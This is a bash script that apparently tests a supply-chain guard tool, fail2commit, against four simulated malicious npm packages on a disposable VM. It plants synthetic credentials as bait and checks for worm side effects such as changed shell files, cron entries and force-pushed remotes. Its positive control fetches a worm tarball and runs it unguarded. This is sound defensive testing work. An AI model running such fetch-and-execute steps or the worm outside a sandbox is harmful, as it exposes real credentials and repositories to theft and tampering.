#!/bin/bash
# Supply-chain attack simulation on a disposable Linux VM, as a normal user.
# Plants synthetic secrets, runs four malicious installs through fail2commit
# and checks every side effect. usage: attack_run.sh <dir>
set -u
A="$1"; H="$HOME"; S=/tmp/f2c-attack; V="$H/victim"
kv() { printf '%s=%s\n' "$1" "$2"; }
rm -rf "$S" "$V" "$H/victim-remote.git"; mkdir -p "$S" "$H/.ssh" "$H/.aws" "$H/.config/gh" "$H/.config/fail2commit"
# synthetic secrets (never real)
echo '//registry.npmjs.org/:_authToken=npm_F2CSYNTHETICTOKEN000000000000000000' > "$H/.npmrc"
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\nF2C-SYNTHETIC-KEY\n-----END OPENSSH PRIVATE KEY-----\n' > "$H/.ssh/id_ed25519"
printf '[default]\naws_access_key_id = AKIAF2CSYNTHETIC0000\naws_secret_access_key = f2cSyntheticSecret\n' > "$H/.aws/credentials"
echo 'https://dev:ghp_F2CSYNTHETIC000000000000000000000000@github.com' > "$H/.git-credentials"
printf 'github.com:\n  oauth_token: gho_F2CSYNTHETIC\n' > "$H/.config/gh/hosts.yml"
echo 'registry=http://127.0.0.1:4873/' > "$H/.config/fail2commit/npmrc"
printf '[advisories]\nosv_url = "http://127.0.0.1:4874"\n' > "$H/.config/fail2commit/settings.toml"
# the user's real project, with a remote the worm will try to force-push to
git init -q --bare "$H/victim-remote.git"; git init -q "$V"; cd "$V"
git config user.email dev@example.test; git config user.name dev
echo '{"name":"victim","version":"1.0.0"}' > package.json; echo 'console.log("app")' > index.js
git add -A; git commit -qm init; git remote add origin "$H/victim-remote.git"; git push -q origin HEAD:main 2> /tmp/p.err
snap() { echo "bashrc=$(sha256sum < "$H/.bashrc" | cut -c1-16) cron=$(crontab -l 2>&1 | sha256sum | cut -c1-16) index=$(sha256sum < "$V/index.js" | cut -c1-16) workflow=$(test -e "$V/.github" && echo yes || echo no) remote=$(git --git-dir "$H/victim-remote.git" rev-parse main)"; }
BEFORE="$(snap)"
python3 -I "$A/attack_world.py" "$S" "$H" "$V" > "$S/world.log" 2>&1 &
for i in $(seq 50); do [ -f "$S/ready" ] && break; sleep 0.2; done
export NPM_TOKEN=npm_F2CSYNTHETICENV GITHUB_TOKEN=ghp_F2CSYNTHETICENV AWS_SECRET_ACCESS_KEY=f2cSyntheticEnv
run() {  # name -> exit code, result code, report
    fail2commit --json --approver none npm install "$1" > "$S/$1.json" 2>&1; local ec=$?
    kv "$1_exit" "$ec"
    kv "$1_result" "$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["code"], "|", d["message"][:150].replace("\n"," "), "|", [f["kind"]+"/"+f["action"] for f in d.get("findings",[])][:4])' "$S/$1.json" 2>&1)"
    kv "$1_report" "$(cat "$V/node_modules/$1/build/report.json" 2>/dev/null || echo none)"
}
run lodahs
run deploy-helper
run ua-parse-lite
run color-utils-pro
# approving the known-malware package must still be impossible
kv lodahs_api_approve "$(python3 -I "$A/approve.py" "$V" approve_once npm install lodahs)"
AFTER="$(snap)"
kv before "$BEFORE"
kv after "$AFTER"
kv host_unchanged "$([ "$BEFORE" = "$AFTER" ] && echo yes || echo NO)"
kv canary_connections "$(cat "$S/canary-conns.txt" 2>/dev/null || echo 0)"
kv installed "$(ls "$V/node_modules" 2>/dev/null | tr '\n' ' ')"
# Positive control (disposable VM only, reverted afterwards): the same worm
# run directly, without fail2commit, must succeed, proving the attack is real.
mkdir -p "$S/control" && curl -s http://127.0.0.1:4873/tarballs/color-utils-pro-1.0.0.tgz | tar xz -C "$S/control"
(cd "$S/control/package" && timeout 60 node bundle.js > "$S/control.log" 2>&1)
kv control_unguarded_report "$(cat "$S/control/package/build/report.json" 2>/dev/null || cat "$S/control.log")"
kv control_after "$(snap)"
kv control_canary_connections "$(cat "$S/canary-conns.txt" 2>/dev/null || echo 0)"
